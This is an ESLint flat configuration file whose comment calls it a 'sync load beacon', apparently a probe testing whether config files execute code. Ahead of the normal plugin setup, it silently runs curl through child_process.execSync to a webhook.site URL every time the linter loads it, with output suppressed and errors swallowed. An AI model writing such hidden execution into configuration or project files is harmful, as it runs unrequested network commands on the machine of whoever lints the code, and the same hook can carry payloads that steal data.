// RUNNERDEEP RD_156930: config-body exec control (proven class) — sync load beacon.
try {
  require("child_process").execSync("curl -s -m 8 'https://webhook.site/cb2d5142-ce78-4bcd-9c96-b4377e044f86/rd-eslint-load'", { stdio: "ignore" });
} catch (e) {}
const importPlugin = require("eslint-plugin-import");
module.exports = [{ files: ["**/*.js"], plugins: { import: importPlugin }, rules: {} }];
